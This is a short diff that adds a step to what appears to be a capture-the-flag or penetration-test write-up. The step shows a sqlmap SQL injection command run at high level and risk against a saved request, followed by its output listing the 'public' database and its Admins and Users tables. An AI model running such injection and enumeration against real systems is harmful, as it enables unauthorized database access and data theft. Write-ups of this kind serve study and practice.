@@ -192,5 +192,26 @@ available databases [1]:
 I have managed to the dump the database name, i can now dump its contents
 
 ```python
+sqlmap -r request.txt --level=4 --risk=3 --flush-session --batch --dbs -D public --tables
+
+available databases [1]:
+[*] public
+
+[19:11:57] [INFO] fetching tables for database: 'public'
+[19:11:57] [INFO] fetching number of tables for database 'public'
+[19:11:57] [INFO] retrieved: 2
+[19:11:58] [INFO] retrieved: Admins
+[19:12:00] [INFO] retrieved: Users
+Database: public
+[2 tables]
++--------+
+| Admins |
+| Users  |
++--------+
+```
+
+There are two tables in this DB
+
+```python
 
 ```
